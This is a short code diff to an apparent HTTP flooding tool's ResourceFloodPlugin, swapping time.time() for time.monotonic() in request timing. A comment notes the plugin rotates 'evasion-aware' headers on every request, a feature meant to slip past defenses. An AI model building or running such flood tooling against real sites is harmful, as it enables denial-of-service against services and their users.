@@ -175,11 +175,11 @@ class ResourceFloodPlugin(AttackPlugin):
 
                 # v25 P1: Use evasion-aware fresh headers for EVERY request
                 headers = self._get_fresh_headers(context, "resource")
-                t = time.time()
+                t = time.monotonic()
                 try:
                     async with context.session.get(url, headers=headers,
                                                    ssl=_ssl, allow_redirects=False) as resp:
-                        rt = time.time() - t
+                        rt = time.monotonic() - t
                         resp_headers = dict(resp.headers)
                         response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                         ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
@@ -188,7 +188,7 @@ class ResourceFloodPlugin(AttackPlugin):
                 except asyncio.CancelledError:
                     raise
                 except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
-                    rt = time.time() - t
+                    rt = time.monotonic() - t
                     self._on_request_result(worker_id, False)
                     await self._record("RES", False, 0, rt,
                                        err=type(exc).__name__, url=url[:60])
